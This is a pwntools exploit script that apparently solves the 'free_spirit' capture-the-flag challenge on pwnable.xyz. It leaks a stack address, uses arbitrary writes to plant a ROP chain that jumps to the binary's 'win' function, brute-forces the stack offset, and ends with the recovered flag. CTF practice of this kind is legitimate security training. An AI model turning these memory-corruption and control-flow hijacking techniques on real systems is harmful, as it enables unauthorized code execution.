#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.binary = "./free_spirit"
context.log_level = "debug"
elf = ELF("./free_spirit", checksec = False)

def edit(cont):
    assert len(cont) < 0x20
    io.sendlineafter("> ", "1")
    sleep(0.01)
    io.send(cont)
    sleep(0.01)

def leak():
    io.sendlineafter("> ", "2")
    sleep(0.01)
    return int(io.recvline(), 16)

def write():
    io.sendlineafter("> ", "3")
    sleep(0.01)

def _exit():
    sleep(0.01)
    io.sendlineafter("> ", "0")


i = -50
while True:
    i -= 1
    success("i -> {}".format(i))
    #  pause()
    #  io = process("./free")
    io = remote("svc.pwnable.xyz", 30005)
    
    stack = leak()
    success("stack -> {:#x}".format(stack))
    
    gdbcmd = '''
    b *0x40085B
    b *0x400870
    b *0x400884
    b *0x4008BD
    c
    '''
    #  gdb.attach(io, gdbscript = gdbcmd)
    #  pause()
    
    
    edit(flat('0' * 8, stack + 0x58))
    write()
    
    edit(flat(0x0000000000400742, stack + i * 8, 0x0000000000400746, elf.sym['win'])[: -1]) # add rsp; ret; ret;
    write()
    
    _exit()
    
    try:
        io.interactive()
    except:
        io.close()
'''
i = -54
FLAG{I_promise_it_gets_better}
'''
